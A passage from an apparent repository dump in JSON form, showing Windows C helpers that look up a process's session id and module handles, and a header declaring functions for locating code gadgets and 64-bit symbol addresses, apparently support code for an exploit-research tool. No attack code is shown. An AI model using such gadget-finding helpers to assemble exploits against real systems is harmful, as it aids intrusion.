ImageName, and returns it's SessionId.\nDWORD GetSessionIdByImageName(PCHAR ImageName)\n{\n    CHAR CurrentImageName[MAX_PATH];\n    ULONG ReturnLength;\n    PSYSTEM_PROCESS_INFORMATION ProcessArray, Current;\n    DWORD ReturnValue = 0;\n    NTSTATUS Result;\n\n    ReturnLength = MAX_PROCESS * sizeof(SYSTEM_PROCESS_INFORMATION);\n    ProcessArray = malloc(ReturnLength);\n\n    Result = NtQuerySystemInformation(SystemProcessInformation, ProcessArray, ReturnLength, &ReturnLength);\n\n    if (Result != 0) {\n      LogMessage(stderr, \"Unexpected NtQuerySystemInformation() result, %#x\", Result);\n      return 0;\n    }\n\n    for (Current = ProcessArray;; Current = (PVOID)((PBYTE)(Current) + Current->NextEntryOffset)) {\n      snprintf(CurrentImageName, sizeof CurrentImageName, \"%wZ\", &Current->ImageName);\n        if (stricmp(CurrentImageName, ImageName) == 0) {\n          ReturnValue = Current->SessionId;\n          break;\n        }\n        if (Current->NextEntryOffset == 0) {\n          LogMessage(stderr, \"QuerySessionIdByImageName, Unknown Process %s\", ImageName);\n          break;\n        }\n    }\n    free(ProcessArray);\n    return ReturnValue;\n}\n\nUINT64 QueryModuleHandle32(PCHAR ModuleName)\n{\n    HMODULE Module = LoadLibrary(ModuleName);\n\n    if (Module) {\n        FreeLibrary(Module);\n    }\n\n    return (UINT64) Module;\n}\n"
        },
        {
          "name": "winutil.h",
          "type": "blob",
          "size": 0.8525390625,
          "content": "#ifndef __WINUTIL_H\n#define __WINUTIL_H\n\nBOOL GetActiveThreadInfo(PDWORD ThreadId, HWND *Window, PDWORD ProcessId);\nDWORD GetFocusThread(void);\nPVOID QueryImageName(DWORD ProcessId);\nUINT64 QueryModuleHandle64(PCHAR Module);\nUINT64 QueryModuleHandle32(PCHAR Module);\nINT64 FindGadgetOffset(PCHAR Module, PCHAR Gadget, SIZE_T GadgetLen);\nDWORD GetSessionIdByImageName(PCHAR ImageName);\n\n// This finds the ImageBase and offset of a symbol from a 64bit module, this is\n// complicated because we're a 32bit process.\nBOOL GetSymbolInfo64(PCHAR Filename,\n                     PCHAR Export,\n                     PBOOL Is64,\n                     PULONGLONG ImageBase,\n                     PULONGLONG Address);\n\nBOOL GetSectionProperty(PCHAR Filename,\n                        PCHAR Section,\n                        PCHAR Property,\n                        PULONGLONG Result);\n#endif\n"
        }
      ]
    }
  ]
}